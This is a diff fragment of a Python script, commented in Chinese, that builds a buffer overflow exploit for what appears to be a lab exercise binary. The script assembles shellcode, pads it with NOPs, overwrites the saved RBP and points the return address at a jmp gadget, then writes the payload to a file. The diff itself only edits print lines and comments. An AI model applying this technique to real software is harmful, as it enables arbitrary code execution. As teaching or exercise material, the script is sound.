@@ -20,7 +20,7 @@ shellcode += b'\x5f'                        # pop rdi
 shellcode += b'\xb8\x16\x12\x40\x00'        # mov eax, 0x401216 (func1_addr)
 shellcode += b'\xff\xd0'                    # call rax
 
-print(f"Shellcode 长度: {len(shellcode)} 字节")
+print(shellcode)
 
 
 # shellcode在buffer最开头
@@ -28,11 +28,11 @@ print(f"Shellcode 长度: {len(shellcode)} 字节")
 padding_len = 32 - len(shellcode)
 payload = shellcode + b'\x90' * padding_len
 
-# 覆盖 RBP (8字节，随便填)
+# 覆盖 RBP 
 payload += b'B' * 8
 
 # 覆盖返回地址指向 jmp_xs
-# func返回时会去执行jmp_xs，跳回shellcode
+# func返回时执行jmp_xs，跳回shellcode
 payload += struct.pack('<Q', jmp_xs_addr)
 
 
@@ -41,4 +41,4 @@ print(f"Payload 总长度: {len(payload)} 字节")
 with open("ans3.txt", "wb") as f:
     f.write(payload)
 
-print("生成完毕！请运行 ./problem3 ans3.txt")
+print(payload)
